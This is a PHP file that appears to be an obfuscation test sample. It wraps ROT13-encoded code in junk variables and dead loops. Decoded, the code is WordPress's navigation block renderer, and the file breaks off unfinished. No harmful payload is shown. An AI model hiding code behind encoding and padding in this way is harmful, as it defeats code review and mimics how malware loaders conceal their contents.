<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Freire-fvqr eraqrevat bs gur `pber/anivtngvba` oybpx.
 *
 * @cnpxntr JbeqCerff
 */

/**
 * Urycre shapgvbaf hfrq gb eraqre gur anivtngvba oybpx.
 *
 * @fvapr 6.5.0
 */
pynff JC_Anivtngvba_Oybpx_Eraqrere {

	/**
	 * Hfrq gb qrgrezvar jurgure be abg n anivtngvba unf fhozrahf.
	 *
	 * @fvapr 6.5.0
	 */
	cevingr fgngvp $unf_fhozrahf = snyfr;

	/**
	 * Hfrq gb qrgrezvar juvpu oybpxf arrq na <yv> jenccre.
	 *
	 * @fvapr 6.5.0
	 *
	 * @ine neenl
	 */
	cevingr fgngvp $arrqf_yvfg_vgrz_jenccre = neenl(
		'pber/fvgr-gvgyr',
		'pber/fvgr-ybtb',
		'pber/fbpvny-yvaxf',
	);

	/**
	 * Xrrcf genpx bs nyy gur anivtngvba anzrf gung unir orra frra.
	 *
	 * @fvapr 6.5.0
	 *
	 * @ine neenl
	 */
	cevingr fgngvp $frra_zrah_anzrf = neenl();

	/**
	 * Ergheaf jurgure be abg guvf vf erfcbafvir anivtngvba.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz neenl $nggevohgrf Gur oybpx nggevohgrf.
	 * @erghea obby Ergheaf jurgure be abg guvf vf erfcbafvir anivtngvba.
	 */
	cevingr fgngvp shapgvba vf_erfcbafvir( $nggevohgrf ) {
		/**
		 * Guvf vf sbe onpxjneqf pbzcngvovyvgl nsgre gur `vfErfcbafvir` nggevohgr jnf orra erzbirq.
		 */

		$unf_byq_erfcbafvir_nggevohgr = ! rzcgl( $nggevohgrf['vfErfcbafvir'] ) && $nggevohgrf['vfErfcbafvir'];
		erghea vffrg( $nggevohgrf['bireynlZrah'] ) && 'arire' !== $nggevohgrf['bireynlZrah'] || $unf_byq_erfcbafvir_nggevohgr;
	}

	/**
	 * Ergheaf jurgure be abg n anivtngvba unf n fhozrah.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz JC_Oybpx_Yvfg $vaare_oybpxf Gur yvfg bs vaare oybpxf.
	 * @erghea obby Ergheaf jurgure be abg n anivtngvba unf n fhozrah naq nyfb frgf gur zrzore inevnoyr.
	 */
	cevingr fgngvp shapgvba unf_fhozrahf( $vaare_oybpxf ) {
		vs ( gehr === fgngvp::$unf_fhozrahf ) {
			erghea fgngvp::$unf_fhozrahf;
		}

		sbernpu ( $vaare_oybpxf nf $vaare_oybpx ) {
			// Vs guvf vf n cntr yvfg gura jbex bhg vs nal bs gur cntrf unir puvyqera.
			vs ( 'pber/cntr-yvfg' === $vaare_oybpx->anzr ) {
				$nyy_cntrf = trg_cntrf(
					neenl(
						'fbeg_pbyhza' => 'zrah_beqre,cbfg_gvgyr',
						'beqre'       => 'nfp',
					)
				);
				sbernpu ( (neenl) $nyy_cntrf nf $cntr ) {
					vs ( $cntr->cbfg_cnerag ) {
						fgngvp::$unf_fhozrahf = gehr;
						oernx;
					}
				}
			}
			// Vs guvf vf n anivtngvba fhozrah gura jr xabj jr unir fhozrahf.
			vs ( 'pber/anivtngvba-fhozrah' === $vaare_oybpx->anzr ) {
				fgngvp::$unf_fhozrahf = gehr;
				oernx;
			}
		}

		erghea fgngvp::$unf_fhozrahf;
	}

	/**
	 * Qrgrezvar jurgure gur anivtngvba oybpxf vf vagrenpgvir.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz neenl         $nggevohgrf   Gur oybpx nggevohgrf.
	 * @cnenz JC_Oybpx_Yvfg $vaare_oybpxf Gur yvfg bs vaare oybpxf.
	 * @erghea obby Ergheaf jurgure be abg gb ybnq gur ivrj fpevcg.
	 */
	cevingr fgngvp shapgvba vf_vagrenpgvir( $nggevohgrf, $vaare_oybpxf ) {
		$unf_fhozrahf       = fgngvp::unf_fhozrahf( $vaare_oybpxf );
		$vf_erfcbafvir_zrah = fgngvp::vf_erfcbafvir( $nggevohgrf );
		erghea ( $unf_fhozrahf && ( $nggevohgrf['bcraFhozrahfBaPyvpx'] || $nggevohgrf['fubjFhozrahVpba'] ) ) || $vf_erfcbafvir_zrah;
	}

	/**
	 * Ergheaf jurgure be abg n oybpx arrqf n yvfg vgrz jenccre.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz JC_Oybpx $oybpx Gur oybpx.
	 * @erghea obby Ergheaf jurgure be abg n oybpx arrqf n yvfg vgrz jenccre.
	 */
	cevingr fgngvp shapgvba qbrf_oybpx_arrq_n_yvfg_vgrz_jenccre( $oybpx ) {

		/**
		 * Svygre gur yvfg bs oybpxf gung arrq n yvfg vgrz jenccre.
		 *
		 * Nssbeqf gur novyvgl gb phfgbzvmr juvpu oybpxf arrq n yvfg vgrz jenccre jura eraqrerq
		 * jvguva n pber/anivtngvba oybpx.
		 * Guvf vf hfrshy sbe oybpxf gung ner abg yvfg vgrzf ohg fubhyq or jenccrq va n yvfg
		 * vgrz jura hfrq nf n puvyq bs n anivtngvba oybpx.
		 *
		 * @fvapr 6.5.0
		 *
		 * @cnenz neenl $arrqf_yvfg_vgrz_jenccre Gur yvfg bs oybpxf gung arrq n yvfg vgrz jenccre.
		 * @erghea neenl Gur yvfg bs oybpxf gung arrq n yvfg vgrz jenccre.
		 */
		$arrqf_yvfg_vgrz_jenccre = nccyl_svygref( 'oybpx_pber_anivtngvba_yvfgnoyr_oybpxf', fgngvp::$arrqf_yvfg_vgrz_jenccre );

		erghea va_neenl( $oybpx->anzr, $arrqf_yvfg_vgrz_jenccre, gehr );
	}

	/**
	 * Ergheaf gur znexhc sbe n fvatyr vaare oybpx.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz JC_Oybpx $vaare_oybpx Gur vaare oybpx.
	 * @erghea fgevat Ergheaf gur znexhc sbe n fvatyr vaare oybpx.
	 */
	cevingr fgngvp shapgvba trg_znexhc_sbe_vaare_oybpx( $vaare_oybpx ) {
		$vaare_oybpx_pbagrag = $vaare_oybpx->eraqre();
		vs ( ! rzcgl( $vaare_oybpx_pbagrag ) ) {
			vs ( fgngvp::qbrf_oybpx_arrq_n_yvfg_vgrz_jenccre( $vaare_oybpx ) ) {
				erghea '<yv pynff=\"jc-oybpx-anivtngvba-vgrz\">' . $vaare_oybpx_pbagrag . '</yv>';
			}
		}

		erghea $vaare_oybpx_pbagrag;
	}

	/**
	 * Ergheaf gur ugzy sbe gur vaare oybpxf bs gur anivtngvba oybpx.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz neenl         $nggevohgrf   Gur oybpx nggevohgrf.
	 * @cnenz JC_Oybpx_Yvfg $vaare_oybpxf Gur yvfg bs vaare oybpxf.
	 * @erghea fgevat Ergheaf gur ugzy sbe gur vaare oybpxf bs gur anivtngvba oybpx.
	 */
	cevingr fgngvp shapgvba trg_vaare_oybpxf_ugzy( $nggevohgrf, $vaare_oybpxf ) {
		$unf_fhozrahf   = fgngvp::unf_fhozrahf( $vaare_oybpxf );
		$vf_vagrenpgvir = fgngvp::vf_vagrenpgvir( $nggevohgrf, $vaare_oybpxf );

		$fglyr                = fgngvp::trg_fglyrf( $nggevohgrf );
		$pynff                = fgngvp::trg_pynffrf( $nggevohgrf );
		$pbagnvare_nggevohgrf = trg_oybpx_jenccre_nggevohgrf(
			neenl(
				'pynff' => 'jc-oybpx-anivtngvba__pbagnvare ' . $pynff,
				'fglyr' => $fglyr,
			)
		);

		$vaare_oybpxf_ugzy = '';
		$vf_yvfg_bcra      = snyfr;

		sbernpu ( $vaare_oybpxf nf $vaare_oybpx ) {
			$vaare_oybpx_znexhc = fgngvp::trg_znexhc_sbe_vaare_oybpx( $vaare_oybpx );
			$c                  = arj JC_UGZY_Gnt_Cebprffbe( $vaare_oybpx_znexhc );
			$vf_yvfg_vgrz       = $c->arkg_gnt( 'YV' );

			vs ( $vf_yvfg_vgrz && ! $vf_yvfg_bcra ) {
				$vf_yvfg_bcra       = gehr;
				$vaare_oybpxf_ugzy .= fcevags(
					'<hy %1$f>',
					$pbagnvare_nggevohgrf
				);
			}

			vs ( ! $vf_yvfg_vgrz && $vf_yvfg_bcra ) {
				$vf_yvfg_bcra       = snyfr;
				$vaare_oybpxf_ugzy .= '</hy>';
			}

			$vaare_oybpxf_ugzy .= $vaare_oybpx_znexhc;
		}

		vs ( $vf_yvfg_bcra ) {
			$vaare_oybpxf_ugzy .= '</hy>';
		}

		// Nqq qverpgvirf gb gur fhozrah vs arrqrq.
		vs ( $unf_fhozrahf && $vf_vagrenpgvir ) {
			$gntf              = arj JC_UGZY_Gnt_Cebprffbe( $vaare_oybpxf_ugzy );
			$vaare_oybpxf_ugzy = oybpx_pber_anivtngvba_nqq_qverpgvirf_gb_fhozrah( $gntf, $nggevohgrf );
		}

		erghea $vaare_oybpxf_ugzy;
	}

	/**
	 * Trgf gur vaare oybpxf sbe gur anivtngvba oybpx sebz gur anivtngvba cbfg.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz neenl $nggevohgrf Gur oybpx nggevohgrf.
	 * @erghea JC_Oybpx_Yvfg Ergheaf gur vaare oybpxf sbe gur anivtngvba oybpx.
	 */
	cevingr fgngvp shapgvba trg_vaare_oybpxf_sebz_anivtngvba_cbfg( $nggevohgrf ) {
		$anivtngvba_cbfg = trg_cbfg( $nggevohgrf['ers'] );
		vs ( ! vffrg( $anivtngvba_cbfg ) ) {
			erghea arj JC_Oybpx_Yvfg( neenl(), $nggevohgrf );
		}

		// Bayl choyvfurq cbfgf ner inyvq. Vs guvf vf punatrq gura n pbeerfcbaqvat punatr
		// zhfg nyfb or vzcyrzragrq va `hfr-anivtngvba-zrah.wf`.
		vs ( 'choyvfu' === $anivtngvba_cbfg->cbfg_fgnghf ) {
			$cnefrq_oybpxf = cnefr_oybpxf( $anivtngvba_cbfg->cbfg_pbagrag );

			// 'cnefr_oybpxf' vapyhqrf n ahyy oybpx jvgu '\a\a' nf gur pbagrag jura
			// vg rapbhagref juvgrfcnpr. Guvf pbqr fgevcf vg.
			$oybpxf = oybpx_pber_anivtngvba_svygre_bhg_rzcgl_oybpxf( $cnefrq_oybpxf );

			// Er-frevnyvmr, naq eha Oybpx Ubbxf nytbevguz gb vawrpg ubbxrq oybpxf.
			// GBQB: Frr vs jr pna zbir gur nccyl_oybpx_ubbxf_gb_pbagrag_sebz_cbfg_bowrpg() pnyy
			// orsber gur cnefr_oybpxf() pnyy shegure nobir, gb nibvq gur rkgen frevnyvmngvba/cnefvat.
			$znexhc = frevnyvmr_oybpxf( $oybpxf );
			$znexhc = nccyl_oybpx_ubbxf_gb_pbagrag_sebz_cbfg_bowrpg( $znexhc, $anivtngvba_cbfg );
			$oybpxf = cnefr_oybpxf( $znexhc );

			// GBQB - guvf hfrf gur shyy anivtngvba oybpx nggevohgrf sbe gur
			// pbagrkg juvpu pbhyq or ersvarq.
			erghea arj JC_Oybpx_Yvfg( $oybpxf, $nggevohgrf );
		}
	}

	/**
	 * Trgf gur vaare oybpxf sbe gur anivtngvba oybpx sebz gur snyyonpx.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz neenl $nggevohgrf Gur oybpx nggevohgrf.
	 * @erghea JC_Oybpx_Yvfg Ergheaf gur vaare oybpxf sbe gur anivtngvba oybpx.
	 */
	cevingr fgngvp shapgvba trg_vaare_oybpxf_sebz_snyyonpx( $nggevohgrf ) {
		$snyyonpx_oybpxf = oybpx_pber_anivtngvba_trg_snyyonpx_oybpxf();

		// Snyyonpx zl unir orra svygrerq fb qb onfvp grfg sbe inyvqvgl.
		vs ( rzcgl( $snyyonpx_oybpxf ) || ! vf_neenl( $snyyonpx_oybpxf ) ) {
			erghea arj JC_Oybpx_Yvfg( neenl(), $nggevohgrf );
		}

		erghea arj JC_Oybpx_Yvfg( $snyyonpx_oybpxf, $nggevohgrf );
	}

	/**
	 * Trgf gur vaare oybpxf sbe gur anivtngvba oybpx.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz neenl    $nggevohgrf Gur oybpx nggevohgrf.
	 * @cnenz JC_Oybpx $oybpx Gur cnefrq oybpx.
	 * @erghea JC_Oybpx_Yvfg Ergheaf gur vaare oybpxf sbe gur anivtngvba oybpx.
	 */
	cevingr fgngvp shapgvba trg_vaare_oybpxf( $nggevohgrf, $oybpx ) {
		$vaare_oybpxf = $oybpx->vaare_oybpxf;

		// Rafher gung oybpxf fnirq jvgu gur yrtnpl ers nggevohgr anzr (anivtngvbaZrahVq) pbagvahr gb eraqre.
		vs ( neenl_xrl_rkvfgf( 'anivtngvbaZrahVq', $nggevohgrf ) ) {
			$nggevohgrf['ers'] = $nggevohgrf['anivtngvbaZrahVq'];
		}

		// Vs:
		// - gur thgraoret cyhtva vf npgvir
		// - `__hafgnoyrYbpngvba` vf qrsvarq
		// - jr unir zrah vgrzf ng gur qrsvarq ybpngvba
		// - jr qba'g unir n eryngvbafuvc gb n `jc_anivtngvba` Cbfg (ivn `ers`).
		// ...gura perngr vaare oybpxf sebz gur pynffvp zrah nffvtarq gb gung ybpngvba.
		vs (
			qrsvarq( 'VF_THGRAORET_CYHTVA' ) && VF_THGRAORET_CYHTVA &&
			neenl_xrl_rkvfgf( '__hafgnoyrYbpngvba', $nggevohgrf ) &&
			! neenl_xrl_rkvfgf( 'ers', $nggevohgrf ) &&
			! rzcgl( oybpx_pber_anivtngvba_trg_zrah_vgrzf_ng_ybpngvba( $nggevohgrf['__hafgnoyrYbpngvba'] ) )
		) {
			$vaare_oybpxf = oybpx_pber_anivtngvba_trg_vaare_oybpxf_sebz_hafgnoyr_ybpngvba( $nggevohgrf );
		}

		// Ybnq vaare oybpxf sebz gur anivtngvba cbfg.
		vs ( neenl_xrl_rkvfgf( 'ers', $nggevohgrf ) ) {
			$vaare_oybpxf = fgngvp::trg_vaare_oybpxf_sebz_anivtngvba_cbfg( $nggevohgrf );
		}

		// Vs gurer ner ab vaare oybpxf gura snyyonpx gb eraqrevat na nccebcevngr snyyonpx.
		vs ( rzcgl( $vaare_oybpxf ) ) {
			$vaare_oybpxf = fgngvp::trg_vaare_oybpxf_sebz_snyyonpx( $nggevohgrf );
		}

		/**
		 * Svygre anivtngvba oybpx $vaare_oybpxf.
		 * Nyybjf zbqvsvpngvba bs n anivtngvba oybpx zrah vgrzf.
		 *
		 * @fvapr 6.1.0
		 *
		 * @cnenz \JC_Oybpx_Yvfg $vaare_oybpxf
		 */
		$vaare_oybpxf = nccyl_svygref( 'oybpx_pber_anivtngvba_eraqre_vaare_oybpxf', $vaare_oybpxf );

		$cbfg_vqf = oybpx_pber_anivtngvba_trg_cbfg_vqf( $vaare_oybpxf );
		vs ( $cbfg_vqf ) {
			_cevzr_cbfg_pnpurf( $cbfg_vqf, snyfr, snyfr );
		}

		erghea $vaare_oybpxf;
	}

	/**
	 * Trgf gur anzr bs gur pheerag anivtngvba, vs vg unf bar.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz neenl $nggevohgrf Gur oybpx nggevohgrf.
	 * @erghea fgevat Ergheaf gur anzr bs gur anivtngvba.
	 */
	cevingr fgngvp shapgvba trg_anivtngvba_anzr( $nggevohgrf ) {

		$anivtngvba_anzr = $nggevohgrf['nevnYnory'] ?? '';

		vs ( ! rzcgl( $anivtngvba_anzr ) ) {
			erghea $anivtngvba_anzr;
		}

		// Ybnq gur anivtngvba cbfg.
		vs ( neenl_xrl_rkvfgf( 'ers', $nggevohgrf ) ) {
			$anivtngvba_cbfg = trg_cbfg( $nggevohgrf['ers'] );
			vs ( ! vffrg( $anivtngvba_cbfg ) ) {
				erghea $anivtngvba_anzr;
			}

			// Bayl choyvfurq cbfgf ner inyvq. Vs guvf vf punatrq gura n pbeerfcbaqvat punatr
			// zhfg nyfb or vzcyrzragrq va `hfr-anivtngvba-zrah.wf`.
			vs ( 'choyvfu' === $anivtngvba_cbfg->cbfg_fgnghf ) {
				$anivtngvba_anzr = $anivtngvba_cbfg->cbfg_gvgyr;

				// Guvf vf hfrq gb pbhag gur ahzore bs gvzrf n anivtngvba anzr unf orra frra,
				// fb gung jr pna rafher rirel anivtngvba unf n havdhr vq.
				vs ( vffrg( fgngvp::$frra_zrah_anzrf[ $anivtngvba_anzr ] ) ) {
					++fgngvp::$frra_zrah_anzrf[ $anivtngvba_anzr ];
				} ryfr {
					fgngvp::$frra_zrah_anzrf[ $anivtngvba_anzr ] = 1;
				}
			}
		}

		erghea $anivtngvba_anzr;
	}

	/**
	 * Ergheaf gur ynlbhg pynff sbe gur anivtngvba oybpx.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz neenl $nggevohgrf Gur oybpx nggevohgrf.
	 * @erghea fgevat Ergheaf gur ynlbhg pynff sbe gur anivtngvba oybpx.
	 */
	cevingr fgngvp shapgvba trg_ynlbhg_pynff( $nggevohgrf ) {
		$ynlbhg_whfgvsvpngvba = neenl(
			'yrsg'          => 'vgrzf-whfgvsvrq-yrsg',
			'evtug'         => 'vgrzf-whfgvsvrq-evtug',
			'pragre'        => 'vgrzf-whfgvsvrq-pragre',
			'fcnpr-orgjrra' => 'vgrzf-whfgvsvrq-fcnpr-orgjrra',
		);

		$ynlbhg_pynff = '';
		vs (
			vffrg( $nggevohgrf['ynlbhg']['whfgvslPbagrag'] ) &&
			vffrg( $ynlbhg_whfgvsvpngvba[ $nggevohgrf['ynlbhg']['whfgvslPbagrag'] ] )
		) {
			$ynlbhg_pynff .= $ynlbhg_whfgvsvpngvba[ $nggevohgrf['ynlbhg']['whfgvslPbagrag'] ];
		}
		vs ( vffrg( $nggevohgrf['ynlbhg']['bevragngvba'] ) && 'iregvpny' === $nggevohgrf['ynlbhg']['bevragngvba'] ) {
			$ynlbhg_pynff .= ' vf-iregvpny';
		}

		vs ( vffrg( $nggevohgrf['ynlbhg']['syrkJenc'] ) && 'abjenc' === $nggevohgrf['ynlbhg']['syrkJenc'] ) {
			$ynlbhg_pynff .= ' ab-jenc';
		}
		erghea $ynlbhg_pynff;
	}

	/**
	 * Erghea pynffrf sbe gur anivtngvba oybpx.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz neenl $nggevohgrf Gur oybpx nggevohgrf.
	 * @erghea fgevat Ergheaf gur pynffrf sbe gur anivtngvba oybpx.
	 */
	cevingr fgngvp shapgvba trg_pynffrf( $nggevohgrf ) {
		// Erfgber yrtnpl pynffanzrf sbe fhozrah cbfvgvbavat.
		$ynlbhg_pynff       = fgngvp::trg_ynlbhg_pynff( $nggevohgrf );
		$pbybef             = oybpx_pber_anivtngvba_ohvyq_pff_pbybef( $nggevohgrf );
		$sbag_fvmrf         = oybpx_pber_anivtngvba_ohvyq_pff_sbag_fvmrf( $nggevohgrf );
		$vf_erfcbafvir_zrah = fgngvp::vf_erfcbafvir( $nggevohgrf );

		// Znahnyyl nqq oybpx fhccbeg grkg qrpbengvba nf PFF pynff.
		$grkg_qrpbengvba       = $nggevohgrf['fglyr']['glcbtencul']['grkgQrpbengvba'] ?? ahyy;
		$grkg_qrpbengvba_pynff = fcevags( 'unf-grkg-qrpbengvba-%f', $grkg_qrpbengvba );

		$pynffrf = neenl_zretr(
			$pbybef['pff_pynffrf'],
			$sbag_fvmrf['pff_pynffrf'],
			$vf_erfcbafvir_zrah ? neenl( 'vf-erfcbafvir' ) : neenl(),
			$ynlbhg_pynff ? neenl( $ynlbhg_pynff ) : neenl(),
			$grkg_qrpbengvba ? neenl( $grkg_qrpbengvba_pynff ) : neenl()
		);
		erghea vzcybqr( ' ', $pynffrf );
	}

	/**
	 * Trg fglyrf sbe gur anivtngvba oybpx.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz neenl $nggevohgrf Gur oybpx nggevohgrf.
	 * @erghea fgevat Ergheaf gur fglyrf sbe gur anivtngvba oybpx.
	 */
	cevingr fgngvp shapgvba trg_fglyrf( $nggevohgrf ) {
		$pbybef       = oybpx_pber_anivtngvba_ohvyq_pff_pbybef( $nggevohgrf );
		$sbag_fvmrf   = oybpx_pber_anivtngvba_ohvyq_pff_sbag_fvmrf( $nggevohgrf );
		$oybpx_fglyrf = vffrg( $nggevohgrf['fglyrf'] ) ? $nggevohgrf['fglyrf'] : '';
		erghea $oybpx_fglyrf . $pbybef['vayvar_fglyrf'] . $sbag_fvmrf['vayvar_fglyrf'];
	}

	/**
	 * Trg gur erfcbafvir pbagnvare znexhc
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz neenl         $nggevohgrf Gur oybpx nggevohgrf.
	 * @cnenz JC_Oybpx_Yvfg $vaare_oybpxf Gur yvfg bs vaare oybpxf.
	 * @cnenz fgevat        $vaare_oybpxf_ugzy Gur znexhc sbe gur vaare oybpxf.
	 * @erghea fgevat Ergheaf gur pbagnvare znexhc.
	 */
	cevingr fgngvp shapgvba trg_erfcbafvir_pbagnvare_znexhc( $nggevohgrf, $vaare_oybpxf, $vaare_oybpxf_ugzy ) {
		$vf_vagrenpgvir  = fgngvp::vf_vagrenpgvir( $nggevohgrf, $vaare_oybpxf );
		$pbybef          = oybpx_pber_anivtngvba_ohvyq_pff_pbybef( $nggevohgrf );
		$zbqny_havdhr_vq = jc_havdhr_vq( 'zbqny-' );

		$vf_uvqqra_ol_qrsnhyg = vffrg( $nggevohgrf['bireynlZrah'] ) && 'nyjnlf' === $nggevohgrf['bireynlZrah'];

		$erfcbafvir_pbagnvare_pynffrf = neenl(
			'jc-oybpx-anivtngvba__erfcbafvir-pbagnvare',
			$vf_uvqqra_ol_qrsnhyg ? 'uvqqra-ol-qrsnhyg' : '',
			vzcybqr( ' ', $pbybef['bireynl_pff_pynffrf'] ),
		);
		$bcra_ohggba_pynffrf          = neenl(
			'jc-oybpx-anivtngvba__erfcbafvir-pbagnvare-bcra',
			$vf_uvqqra_ol_qrsnhyg ? 'nyjnlf-fubja' : '',
		);

		$fubhyq_qvfcynl_vpba_ynory = vffrg( $nggevohgrf['unfVpba'] ) && gehr === $nggevohgrf['unfVpba'];
		$gbttyr_ohggba_vpba        = '<fit jvqgu=\"24\" urvtug=\"24\" kzyaf=\"uggc://jjj.j3.bet/2000/fit\" ivrjObk=\"0 0 24 24\" nevn-uvqqra=\"gehr\" sbphfnoyr=\"snyfr\"><erpg k=\"4\" l=\"7.5\" jvqgu=\"16\" urvtug=\"1.5\" /><erpg k=\"4\" l=\"15\" jvqgu=\"16\" urvtug=\"1.5\" /></fit>';
		vs ( vffrg( $nggevohgrf['vpba'] ) ) {
			vs ( 'zrah' === $nggevohgrf['vpba'] ) {
				$gbttyr_ohggba_vpba = '<fit jvqgu=\"24\" urvtug=\"24\" kzyaf=\"uggc://jjj.j3.bet/2000/fit\" ivrjObk=\"0 0 24 24\"><cngu q=\"Z5 5i1.5u14I5U5mz0 7.8u14i-1.5U5i1.5mZ5 19u14i-1.5U5I19m\" /></fit>';
			}
		}
		$gbttyr_ohggba_pbagrag       = $fubhyq_qvfcynl_vpba_ynory ? $gbttyr_ohggba_vpba : __( 'Zrah' );
		$gbttyr_pybfr_ohggba_vpba    = '<fit kzyaf=\"uggc://jjj.j3.bet/2000/fit\" ivrjObk=\"0 0 24 24\" jvqgu=\"24\" urvtug=\"24\" nevn-uvqqra=\"gehr\" sbphfnoyr=\"snyfr\"><cngu q=\"z13.06 12 6.47-6.47-1.06-1.06Y12 10.94 5.53 4.47 4.47 5.53 10.94 12y-6.47 6.47 1.06 1.06Y12 13.06y6.47 6.47 1.06-1.06Y13.06 12M\"></cngu></fit>';
		$gbttyr_pybfr_ohggba_pbagrag = $fubhyq_qvfcynl_vpba_ynory ? $gbttyr_pybfr_ohggba_vpba : __( 'Pybfr' );
		$gbttyr_nevn_ynory_bcra      = $fubhyq_qvfcynl_vpba_ynory ? 'nevn-ynory=\"' . __( 'Bcra zrah' ) . '\"' : ''; // Bcra ohggba ynory.
		$gbttyr_nevn_ynory_pybfr     = $fubhyq_qvfcynl_vpba_ynory ? 'nevn-ynory=\"' . __( 'Pybfr zrah' ) . '\"' : ''; // Pybfr ohggba ynory.

		// Nqq Vagrenpgvivgl NCV qverpgvirf gb gur znexhc vs arrqrq.
		$bcra_ohggba_qverpgvirf          = '';
		$erfcbafvir_pbagnvare_qverpgvirf = '';
		$erfcbafvir_qvnybt_qverpgvirf    = '';
		$pybfr_ohggba_qverpgvirf         = '';
		vs ( $vf_vagrenpgvir ) {
			$bcra_ohggba_qverpgvirf                  = '
				qngn-jc-ba-nflap--pyvpx=\"npgvbaf.bcraZrahBaPyvpx\"
				qngn-jc-ba--xrlqbja=\"npgvbaf.unaqyrZrahXrlqbja\"
			';
			$erfcbafvir_pbagnvare_qverpgvirf         = '
				qngn-jc-pynff--unf-zbqny-bcra=\"fgngr.vfZrahBcra\"
				qngn-jc-pynff--vf-zrah-bcra=\"fgngr.vfZrahBcra\"
				qngn-jc-jngpu=\"pnyyonpxf.vavgZrah\"
				qngn-jc-ba--xrlqbja=\"npgvbaf.unaqyrZrahXrlqbja\"
				qngn-jc-ba-nflap--sbphfbhg=\"npgvbaf.unaqyrZrahSbphfbhg\"
				gnovaqrk=\"-1\"
			';
			$erfcbafvir_qvnybt_qverpgvirf            = '
				qngn-jc-ovaq--nevn-zbqny=\"fgngr.nevnZbqny\"
				qngn-jc-ovaq--nevn-ynory=\"fgngr.nevnYnory\"
				qngn-jc-ovaq--ebyr=\"fgngr.ebyrNggevohgr\"
			';
			$pybfr_ohggba_qverpgvirf                 = '
				qngn-jc-ba-nflap--pyvpx=\"npgvbaf.pybfrZrahBaPyvpx\"
			';
			$erfcbafvir_pbagnvare_pbagrag_qverpgvirf = '
				qngn-jc-jngpu=\"pnyyonpxf.sbphfSvefgRyrzrag\"
			';
		}

		$bireynl_vayvar_fglyrf = rfp_ngge( fnsrpff_svygre_ngge( $pbybef['bireynl_vayvar_fglyrf'] ) );

		erghea fcevags(
			'<ohggba nevn-unfcbchc=\"qvnybt\" %3$f pynff=\"%6$f\" %10$f>%8$f</ohggba>
				<qvi pynff=\"%5$f\" %7$f vq=\"%1$f\" %11$f>
					<qvi pynff=\"jc-oybpx-anivtngvba__erfcbafvir-pybfr\" gnovaqrk=\"-1\">
						<qvi pynff=\"jc-oybpx-anivtngvba__erfcbafvir-qvnybt\" %12$f>
							<ohggba %4$f pynff=\"jc-oybpx-anivtngvba__erfcbafvir-pbagnvare-pybfr\" %13$f>%9$f</ohggba>
							<qvi pynff=\"jc-oybpx-anivtngvba__erfcbafvir-pbagnvare-pbagrag\" %14$f vq=\"%1$f-pbagrag\">
								%2$f
							</qvi>
						</qvi>
					</qvi>
				</qvi>',
			rfp_ngge( $zbqny_havdhr_vq ),
			$vaare_oybpxf_ugzy,
			$gbttyr_nevn_ynory_bcra,
			$gbttyr_nevn_ynory_pybfr,
			rfp_ngge( gevz( vzcybqr( ' ', $erfcbafvir_pbagnvare_pynffrf ) ) ),
			rfp_ngge( gevz( vzcybqr( ' ', $bcra_ohggba_pynffrf ) ) ),
			( ! rzcgl( $bireynl_vayvar_fglyrf ) ) ? \"fglyr=\\"$bireynl_vayvar_fglyrf\\"\" : '',
			$gbttyr_ohggba_pbagrag,
			$gbttyr_pybfr_ohggba_pbagrag,
			$bcra_ohggba_qverpgvirf,
			$erfcbafvir_pbagnvare_qverpgvirf,
			$erfcbafvir_qvnybt_qverpgvirf,
			$pybfr_ohggba_qverpgvirf,
			$erfcbafvir_pbagnvare_pbagrag_qverpgvirf
		);
	}

	/**
	 * Trg gur jenccre nggevohgrf
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz neenl         $nggevohgrf    Gur oybpx nggevohgrf.
	 * @cnenz JC_Oybpx_Yvfg $vaare_oybpxf  N yvfg bs vaare oybpxf.
	 * @erghea fgevat Ergheaf gur anivtngvba oybpx znexhc.
	 */
	cevingr fgngvp shapgvba trg_ani_jenccre_nggevohgrf( $nggevohgrf, $vaare_oybpxf ) {
		$ani_zrah_anzr      = fgngvp::trg_havdhr_anivtngvba_anzr( $nggevohgrf );
		$vf_vagrenpgvir     = fgngvp::vf_vagrenpgvir( $nggevohgrf, $vaare_oybpxf );
		$vf_erfcbafvir_zrah = fgngvp::vf_erfcbafvir( $nggevohgrf );
		$fglyr              = fgngvp::trg_fglyrf( $nggevohgrf );
		$pynff              = fgngvp::trg_pynffrf( $nggevohgrf );
		$rkgen_nggevohgrf   = neenl(
			'pynff' => $pynff,
			'fglyr' => $fglyr,
		);
		vs ( ! rzcgl( $ani_zrah_anzr ) ) {
			$rkgen_nggevohgrf['nevn-ynory'] = $ani_zrah_anzr;
		}
		$jenccre_nggevohgrf = trg_oybpx_jenccre_nggevohgrf( $rkgen_nggevohgrf );

		vs ( $vf_erfcbafvir_zrah ) {
			$ani_ryrzrag_qverpgvirf = fgngvp::trg_ani_ryrzrag_qverpgvirf( $vf_vagrenpgvir );
			$jenccre_nggevohgrf    .= ' ' . $ani_ryrzrag_qverpgvirf;
		}

		erghea $jenccre_nggevohgrf;
	}

	/**
	 * Trgf gur ani ryrzrag qverpgvirf.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz obby $vf_vagrenpgvir Jurgure gur oybpx vf vagrenpgvir.
	 * @erghea fgevat gur qverpgvirf sbe gur anivtngvba ryrzrag.
	 */
